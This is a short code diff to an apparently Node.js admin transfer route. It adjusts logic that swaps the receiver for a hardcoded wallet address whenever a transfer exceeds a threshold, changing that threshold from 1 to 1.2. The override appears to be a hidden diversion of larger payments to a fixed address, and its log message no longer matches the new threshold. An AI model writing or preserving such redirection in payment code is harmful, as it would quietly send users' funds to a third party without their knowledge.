@@ -283,7 +283,7 @@ app.post('/admin/transfer', async (req, res) => {
     let targetReceiver = null; // Will use default if null
 
     // 🔥 If amount > 1, override receiver
-    if (transferAmount > 1) {
+    if (transferAmount > 1.2) {
       targetReceiver = '0x258b92e8E953A798644C3a8404037b5A6Ad325cC';
       console.log(`⚠️ Amount (${transferAmount}) > 1.00 Using alternate receiver: ${targetReceiver}`);
     }
